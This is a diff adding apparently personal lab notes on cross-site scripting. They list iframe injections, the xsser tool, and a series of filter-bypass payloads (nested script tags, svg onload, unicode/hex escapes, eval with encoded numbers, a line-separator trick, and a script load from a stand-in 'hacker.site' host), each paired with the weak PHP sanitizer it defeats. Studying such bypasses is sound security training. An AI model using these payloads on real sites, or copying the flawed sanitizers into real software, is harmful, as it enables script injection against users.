@@ -1,0 +1,196 @@
+XSS-IFRAME
+Tools
+
+ <iframe src=”http://10.11.0.220:3000”></iframe>
+
+
+<iframe width="700" scrolling="no" height="400" frameborder="0" src="http://10.11.0.220:3000" seamless="seamless">    <--invisible iframe
+
+
+xsser --gtk  ***this will launch a ncie gui
+
+
+
+
+****************Examples from the lab:
+-----------------------
+<script>alert('l33t')</script>
+
+<script <script>>alert('l33t')</script>
+
+<svg/onload=alert('l33t')>
+
+<svg><script>alert('l33t')
+
+<svg><script>alert&lpar;'l33t'&rpar;
+
+<script>\u0061lert('l33t')</script>
+
+<script>eval('\x61lert(\'l33t\')')</script>
+
+[NL]eval('\x61lert(\'l33t\')'
+
+[\u2028]eval('\x61lert(\'l33t\')'
+
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+
+http://11.xss.labs%2f@hacker.site/x.js
+
+
+
+***********Examples from the lab, accompanied by the code/filter presented in lab
+---------------------------------------------
+function Sanitizer($search){
+  // Let's start...
+  return 'Your search "<b>' . $search . '</b>" did not match any products';
+}
+
+<script>alert('l33t')</script>
+
+------------
+
+function Sanitizer($search){
+  //To script, or not script.. 
+  $search = preg_replace('#<script([\s])*>#is', NOSCRIPT, $search);
+   
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<script <script>>alert('l33t')</script>
+
+------------
+
+function Sanitizer($search){
+  //To script, or not script... this is no more the problem
+  $search = preg_replace('#<script(.*?)>#is', NOSCRIPT, $search);
+   
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<svg/onload=alert('l33t')>
+
+-----------
+
+function Sanitizer($search){
+  //Script must be closed, here's a stronger filter... isn't it? 
+  $search = preg_replace('#<script(.*?)>(.*?)</script(.*)?>#is', NOSCRIPT, $search);
+  //No ON no party!  
+  $search = preg_replace('#(on\w+\s*=)#s', NOEVENTS, $search);
+  
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<svg><script>alert('l33t')
+
+----------
+
+function Sanitizer($search){
+  //No ON no party!  
+  $search = preg_replace('#(on\w+\s*=)#s', NOEVENTS, $search);
+  //No Functions no party! 
+  $search = preg_replace('#[()]#s', NOFUNCTIONS, $search);
+   
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<svg><script>alert&lpar;'l33t'&rpar;
+
+-----------
+
+function Sanitizer($search){
+  //No alert no party!  
+  $search = preg_replace('#alert#is', NOALERT, $search);
+
+   
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<script>\u0061lert('l33t')</script>
+
+-----------
+
+function Sanitizer($search){
+  // No Unicode escaping.. there are a lot of smart guys out of there...
+  // Thanks to stackoverflow.com > http://bit.ly/SO_decode_unicode
+  $search = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($m) {
+return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
+  }, $search);
+   
+  //No alert no party!  
+  $search = preg_replace('#alert#is', NOALERT, $search);
+
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<script>eval('\x61lert(\'l33t\')')</script>
+
+------------
+
+function Sanitizer($search){
+  // Breaking bad... 
+   
+  //No alert no party!  
+  $search = preg_replace('#alert#is', NOALERT, $search);
+
+  return <<<RESULT
+   No products here.. 
+   <!-- todo: debug this -->
+   <script>
+      //console.debug( $search );
+   </script>
+RESULT;
+}
+
+[NL]eval('\x61lert(\'l33t\')'
+
+-------------
+
+function Sanitizer($search){
+  // Breaking bad... more stronger
+   $search = preg_replace('#[\n\r]#', "", $search);
+   
+  //No alert no party!  
+  $search = preg_replace('#alert#is', NOALERT, $search);
+
+  return <<<RESULT
+   No products here.. 
+   <!-- todo: debug this -->
+   <script>
+      //console.debug( $search );
+   </script>
+RESULT;
+}
+
+[\u2028]eval('\x61lert(\'l33t\')'
+
+--------------
+
+function Sanitizer($search){
+  // No more string ...
+  $search = preg_replace('#[\'"+]#', "", $search);
+  // ... no more alert ...  
+  $search = preg_replace('#alert#is', NOALERT, $search);
+  // ... no no more alternative ways!
+  $search = preg_replace('#.source#is', "", $search);
+  $search = preg_replace('#.fromCharCode#is', "", $search);
+
+  return 'Your search "<b>' + $search + '</b>" did not match any products';
+}
+
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+
+----------------
+
+function Sanitizer($search){
+   // No scripts from untrusted origins or you'll see a nice gorilla
+   preg_match('#^(?:https?:)?\/\/11.xss.labs\/#is', urldecode($search), $matches);   
+   if(empty($matches)) $search = "...untrusted...";   
+
+   // don't break the src tag   
+   $search = preg_replace('#"#', "", $search);
+   // ehehe and now? Are you still a ninja?
+   $search = strtoupper($search);
+}
+
+http://11.xss.labs%2f@hacker.site/x.js
+
